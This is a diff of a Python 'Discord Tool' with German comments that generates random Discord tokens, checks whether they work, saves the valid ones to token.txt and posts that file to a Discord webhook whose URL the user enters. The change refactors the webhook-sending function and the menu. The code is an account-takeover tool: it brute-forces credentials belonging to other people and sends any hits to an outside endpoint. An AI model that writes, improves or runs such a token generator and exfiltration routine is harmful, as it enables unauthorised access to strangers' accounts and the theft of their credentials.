@@ -1,9 +1,10 @@
 import asyncio
 import random
 import string
+import os
 from aiohttp import ClientSession
 from colorama import Fore, Style, init
-import os
+import requests
 
 # Initialisierung für die Farben
 init(autoreset=True)
@@ -45,24 +46,6 @@ async def token_checker(session, token):
     except Exception:
         return False
 
-# Menü-Anzeige und Benutzerinteraktion
-async def show_menu():
-    while True:
-        draw_box("Discord Tool - Main Menu", "1. Generate Discord Tokens\n2. Exit")
-        choice = input("Enter your choice: ")
-
-        if choice == '1':
-            print("Generating Discord Tokens... Press Enter to stop.")
-            async with ClientSession() as session:
-                valid_tokens, invalid_tokens = await generate_until_stopped(token_generator, session)
-                draw_box("Generation Completed", f"Valid Tokens: {len(valid_tokens)}\nInvalid Tokens: {len(invalid_tokens)}")
-                if valid_tokens:
-                    save_and_send(valid_tokens)
-        elif choice == '2':
-            break
-        else:
-            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
-
 # Funktion zum kontinuierlichen Generieren bis zur Eingabe
 async def generate_until_stopped(generator, *args):
     task = asyncio.create_task(generator(*args))
@@ -77,27 +60,40 @@ async def generate_until_stopped(generator, *args):
             break
 
 # Funktion zum Speichern der Tokens und Senden an Discord Webhook
-def save_and_send(valid_tokens):
+def save_and_send(valid_tokens, webhook_url):
     # Speichern der Tokens in einer Datei
     with open('token.txt', 'w') as file:
         for token in valid_tokens:
             file.write(token + '\n')
     
-    # Hier Webhook URL einfügen
-    webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'
-    
-    import requests
-    data = {
-        "content": "Here are the valid Discord tokens",
-        "files": [
-            {"name": "token.txt", "file": open('token.txt', 'rb')}
-        ]
-    }
-    response = requests.post(webhook_url, files=data)
-    if response.status_code == 204:
-        print(f"{Fore.GREEN}Tokens successfully sent to Discord webhook!{Style.RESET_ALL}")
-    else:
-        print(f"{Fore.RED}Failed to send tokens to Discord webhook.{Style.RESET_ALL}")
+    # Senden der Datei an Discord Webhook
+    with open('token.txt', 'rb') as file:
+        files = {'file': ('token.txt', file)}
+        data = {"content": "Here are the valid Discord tokens"}
+        response = requests.post(webhook_url, data=data, files=files)
+        if response.status_code == 204:
+            print(f"{Fore.GREEN}Tokens successfully sent to Discord webhook!{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}Failed to send tokens to Discord webhook.{Style.RESET_ALL}")
+
+# Menü-Anzeige und Benutzerinteraktion
+async def show_menu():
+    while True:
+        draw_box("Discord Tool - Main Menu", "1. Generate Discord Tokens\n2. Exit")
+        choice = input("Enter your choice: ")
+
+        if choice == '1':
+            webhook_url = input("Enter your Discord Webhook URL: ")
+            print("Generating Discord Tokens... Press Enter to stop.")
+            async with ClientSession() as session:
+                valid_tokens, invalid_tokens = await generate_until_stopped(token_generator, session)
+                draw_box("Generation Completed", f"Valid Tokens: {len(valid_tokens)}\nInvalid Tokens: {len(invalid_tokens)}")
+                if valid_tokens:
+                    save_and_send(valid_tokens, webhook_url)
+        elif choice == '2':
+            break
+        else:
+            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
 
 # Hauptfunktion zum Starten des Programms
 async def main():
